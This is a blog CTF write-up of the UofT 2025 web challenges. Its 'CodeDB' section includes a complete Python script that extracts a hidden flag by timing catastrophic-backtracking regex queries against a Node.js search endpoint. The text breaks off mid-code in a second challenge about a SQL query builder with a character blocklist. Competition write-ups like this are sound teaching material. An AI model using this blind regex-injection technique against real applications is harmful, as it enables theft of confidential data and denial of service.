<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>UofT 2025 CTF (Web) :: elmosalamy | blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="CodeDB A pretty cool website that allows you to search a database of files like GitHub.
It came with a list of vibrant code samples written in various languages: Search operations are exposed through the /search endpoint and run on a Node.js worker thread
// index.js app.post(&amp;#39;/search&amp;#39;, async (req, res) =&amp;gt; { const query = req.body.query.trim(); const language = req.body.language; let searchRegex = null; let searchTerm = &amp;#39;&amp;#39;; if (query.startsWith(&amp;#39;/&amp;#39;) &amp;amp;&amp;amp; query." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="//localhost:1313/posts/uoft-2025-ctf/" />




<link rel="stylesheet" href="//localhost:1313/assets/style.css">

  <link rel="stylesheet" href="//localhost:1313/assets/green.css">



<link rel="stylesheet" href="//localhost:1313/style.css">


<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="UofT 2025 CTF (Web)">
<meta property="og:description" content="CodeDB A pretty cool website that allows you to search a database of files like GitHub.
It came with a list of vibrant code samples written in various languages: Search operations are exposed through the /search endpoint and run on a Node.js worker thread
// index.js app.post(&amp;#39;/search&amp;#39;, async (req, res) =&amp;gt; { const query = req.body.query.trim(); const language = req.body.language; let searchRegex = null; let searchTerm = &amp;#39;&amp;#39;; if (query.startsWith(&amp;#39;/&amp;#39;) &amp;amp;&amp;amp; query." />
<meta property="og:url" content="//localhost:1313/posts/uoft-2025-ctf/" />
<meta property="og:site_name" content="elmosalamy | blog" />

  <meta property="og:image" content="//localhost:1313/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2025-01-13 00:00:00 &#43;0000 UTC" />












   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
<script>
  MathJax = {
    tex: {
      displayMath: [['$$', '$$']],  
      inlineMath: [['$', '$']]      
    }
  };
</script>

 
</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    elmosalamy
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a target="" href="/posts">üìù Posts</a></li>
        
      
        
          <li><a target="" href="/tags">üè∑Ô∏è Tags</a></li>
        
      
        
          <li><a target="_blank" href="https://aelmosalamy.github.io">üîó Random stuff</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/posts">üìù Posts</a></li>
      
    
      
        <li><a href="/tags">üè∑Ô∏è Tags</a></li>
      
    
      
        <li><a href="https://aelmosalamy.github.io">üîó Random stuff</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/uoft-2025-ctf/">UofT 2025 CTF (Web)</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2025-01-13 
      </span>
    
    
    <span class="post-author">:: aelmosalamy</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
    
  </span>
  

  

  

  <div class="post-content"><div>
        <h1 id="codedb">CodeDB<a href="#codedb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>A pretty cool website that allows you to search a database of files like GitHub.</p>
<p><img src="/posts/uoft-2025-ctf/codedb_search.png"></p>
<p>It came with a list of vibrant code samples written in various languages:
<img src="/posts/uoft-2025-ctf/codedb_samples.png"></p>
<p>Search operations are exposed through the <code>/search</code> endpoint and run on a Node.js <a href="https://nodejs.org/api/worker_threads.html">worker thread</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// index.js
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">trim</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">language</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">language</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">searchRegex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">searchTerm</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#39;/&#39;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regexPattern</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">searchRegex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#a6e22e">regexPattern</span>, <span style="color:#e6db74">&#39;g&#39;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid Regular Expression&#39;</span> });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">searchTerm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">toLowerCase</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">workerData</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">filesIndex</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">language</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">searchRegex</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">searchTerm</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">PREVIEW_LENGTH</span>
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">results</span> } <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">runSearchWorker</span>(<span style="color:#a6e22e">workerData</span>, <span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">results</span> });
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">chalk</span>.<span style="color:#a6e22e">red</span>(<span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span> });
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>The worker thread:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// index.js
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">runSearchWorker</span>(<span style="color:#a6e22e">workerData</span>, <span style="color:#a6e22e">timeout</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolvePromise</span>, <span style="color:#a6e22e">rejectPromise</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">worker</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Worker</span>(<span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;searchWorker.js&#39;</span>), {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">workerData</span>
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">resolvePromise</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#a6e22e">rejectPromise</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;exit&#39;</span>, (<span style="color:#a6e22e">code</span>) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">code</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">resolvePromise</span>({ <span style="color:#a6e22e">results</span><span style="color:#f92672">:</span> [] });
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">terminate</span>().<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">resolvePromise</span>({ <span style="color:#a6e22e">results</span><span style="color:#f92672">:</span> [] });
</span></span><span style="display:flex;"><span>      });
</span></span><span style="display:flex;"><span>    }, <span style="color:#a6e22e">timeout</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, () =&gt; <span style="color:#a6e22e">clearTimeout</span>(<span style="color:#a6e22e">timer</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, () =&gt; <span style="color:#a6e22e">clearTimeout</span>(<span style="color:#a6e22e">timer</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">worker</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;exit&#39;</span>, () =&gt; <span style="color:#a6e22e">clearTimeout</span>(<span style="color:#a6e22e">timer</span>));
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Notice how we do have full RegEx search capabilities, pretty cool!
<img src="/posts/uoft-2025-ctf/codedb_regex.png"></p>
<p>We have three locations where file visibility is checked.</p>
<p>First in <code>app.js</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/view/:fileName&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fileName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">fileName</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fileData</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">filesIndex</span>[<span style="color:#a6e22e">fileName</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fileData</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">visible</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">404</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;File not found or inaccessible.&#39;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#a6e22e">fileData</span>.<span style="color:#a6e22e">path</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>, (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">chalk</span>.<span style="color:#a6e22e">red</span>(<span style="color:#a6e22e">err</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Server Error&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;view_code&#39;</span>, { <span style="color:#a6e22e">fileName</span>, <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span> });
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>And twice is <code>searchWorker.js</code>, where it is first set and removed from results before handing them over through <code>parentPort</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">---</span> <span style="color:#a6e22e">snip</span> <span style="color:#f92672">---</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">preview</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generatePreview</span>(<span style="color:#a6e22e">content</span>, <span style="color:#a6e22e">matchIndices</span>, <span style="color:#a6e22e">PREVIEW_LENGTH</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preview</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">?</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">fileName</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">preview</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">fileData</span>.<span style="color:#a6e22e">language</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">visible</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">fileData</span>.<span style="color:#a6e22e">visible</span>,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>  })
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">filter</span>((<span style="color:#a6e22e">result</span>) =&gt; <span style="color:#a6e22e">result</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">visible</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">parentPort</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">results</span> });
</span></span></code></pre></div><p>Doing <code>npm audit</code> we notice that it&rsquo;s vulnerable to Regular Expression Denial of Service (ReDoS). A rather theoretical timing attack that can be used to leak information under certain conditions - as well as getting abuse for DoS.</p>
<p>So I wrote this lovely script with binary search:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> multiprocessing.pool <span style="color:#f92672">import</span> ThreadPool
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:3000&#39;</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://34.162.172.123:3000&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TIMEOUT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0.3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_flag_length</span>():
</span></span><span style="display:flex;"><span>    left, right <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">64</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> left <span style="color:#f92672">&lt;=</span> right:
</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;query&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/^(?=uoftctf</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">}}}}</span><span style="color:#e6db74">)((.*)*)*donotexist/&#34;</span>,<span style="color:#e6db74">&#34;language&#34;</span>:<span style="color:#e6db74">&#34;All&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/search&#39;</span>, json<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>        elapsed <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> elapsed <span style="color:#f92672">&gt;</span> TIMEOUT:
</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;.&#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    print()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> right
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_char</span>(i):
</span></span><span style="display:flex;"><span>    left, right <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> left <span style="color:#f92672">&lt;=</span> right:
</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;query&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/^(?=uoftctf</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">*</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>chr(idx)<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#ae81ff">\x7e</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">.*</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)((.*)*)*donotexist/&#34;</span>,<span style="color:#e6db74">&#34;language&#34;</span>:<span style="color:#e6db74">&#34;All&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/search&#39;</span>, json<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>        elapsed <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> elapsed <span style="color:#f92672">&gt;</span> TIMEOUT:
</span></span><span style="display:flex;"><span>            left <span style="color:#f92672">=</span> idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            right <span style="color:#f92672">=</span> idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> chr(right)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_flag_parallel</span>(length):
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    pool <span style="color:#f92672">=</span> ThreadPool(<span style="color:#ae81ff">20</span>)
</span></span><span style="display:flex;"><span>    flag_list <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span>map(leak_char, range(length))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(flag_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag_length <span style="color:#f92672">=</span> leak_flag_length()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] length leaked:&#39;</span>, flag_length)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> leak_flag_parallel(flag_length)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;uoftctf</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#39;</span>)
</span></span></code></pre></div><p><code>uoftctf{why_15_my_4pp_l4661n6_50_b4dly??} </code></p>
<p><strong>References:</strong></p>
<ol>
<li><a href="https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets">https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets</a></li>
<li><a href="https://diary.shift-js.info/blind-regular-expression-injection/">https://diary.shift-js.info/blind-regular-expression-injection/</a></li>
</ol>
<h1 id="prepared-1">Prepared 1<a href="#prepared-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>We have a custom prepared statement generator called <strong>QueryBuilder</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DirtyString</span>:
</span></span><span style="display:flex;"><span>    MALICIOUS_CHARS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#e6db74">&#34;%&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#e6db74">&#34;#&#34;</span>, <span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;)&#34;</span>, <span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;,&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, value, key):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>value <span style="color:#f92672">=</span> value
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>get_value()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_malicious</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> all(<span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;=</span> ord(c) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>value):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> NonPrintableCharacterError(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Non-printable ASCII character found in &#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;.&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>value:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>MALICIOUS_CHARS:
